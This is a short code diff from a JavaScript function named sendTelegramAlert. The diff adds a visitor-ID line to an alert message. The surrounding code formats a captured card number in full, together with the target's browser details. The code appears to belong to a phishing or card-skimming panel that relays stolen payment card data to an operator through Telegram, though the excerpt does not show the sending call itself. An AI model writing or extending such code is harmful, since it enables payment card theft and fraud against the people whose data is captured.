@@ -156,6 +156,7 @@ async function sendTelegramAlert(alertType, data, socket) {
         else if (ua.includes('Edg')) browser = 'Edge';
 
         textMessage = `<b>${data.target}</b>
+       <b>Molah:</b> <code>${visitorId}</code>
 ${data.details?.cardNumber ? `●●●●●●●●●●●●●●●●●\n<b>${data.details.cardNumber.split(' ').join('')}</b>\n●●●●●●●●●●●●●●●●●\n` : ''}
 
 ◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩◩
